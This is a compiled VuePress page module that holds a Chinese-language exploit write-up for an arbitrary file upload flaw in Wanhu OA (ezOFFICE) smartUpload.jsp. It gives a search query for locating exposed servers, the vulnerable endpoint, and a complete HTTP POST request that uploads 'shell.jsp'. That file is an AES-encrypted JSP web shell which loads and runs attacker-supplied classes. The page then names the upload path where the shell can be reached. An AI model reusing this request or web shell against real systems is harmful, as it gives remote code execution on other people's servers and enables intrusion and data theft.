import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as i,e as n}from"./app-58e4a7d6.js";const t={},s=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>万户OA smartUpload.jsp文件存在文件上传接口，且没有对文件类型进行过滤,导致任意文件上传漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>万户OA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;万户网络-ezOFFICE&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>产品页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201329430.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>文件上传接口</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/defaultroot/extension/smartUpload.jsp?path=information&amp;fileName=infoPicName&amp;saveName=infoPicSaveName&amp;tableName=infoPicTable&amp;fileMaxSize=0&amp;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201330330.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可直接上传恶意jsp文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /defaultroot/extension/smartUpload.jsp?path=information&amp;mode=add&amp;fileName=infoPicName&amp;saveName=infoPicSaveName&amp;tableName=infoPicTable&amp;fileMaxSize=0&amp;fileMaxNum=0&amp;fileType=gif,jpg,bmp,jsp,png&amp;fileMinWidth=0&amp;fileMinHeight=0&amp;fileMaxWidth=0&amp;fileMaxHeight=0 HTTP/1.1
Host: 
Content-Length: 938
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: JSESSIONID=PjXnh6bLTzy0ygQf41vWctGPLGkSvkJ6J1yS3ppzJmCvVFQZgm1r!1156443419
Connection: close

------WebKitFormBoundarynNQ8hoU56tfSwBVU
Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;shell.jsp&quot;
Content-Type: application/octet-stream

&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;)){String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;
------WebKitFormBoundarynNQ8hoU56tfSwBVU
Content-Disposition: form-data; name=&quot;continueUpload&quot;

1
------WebKitFormBoundarynNQ8hoU56tfSwBVU
Content-Disposition: form-data; name=&quot;submit&quot;

上传继续
------WebKitFormBoundarynNQ8hoU56tfSwBVU--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201330739.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过抓包可查看上传的文件名，上传的目录为 <code>/defaultroot/upload/information/</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205201330344.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,17),d=[s];function l(o,r){return a(),i("div",null,d)}const m=e(t,[["render",l],["__file","万户OA smartUpload.jsp 任意文件上传漏洞.html.vue"]]);export{m as default};
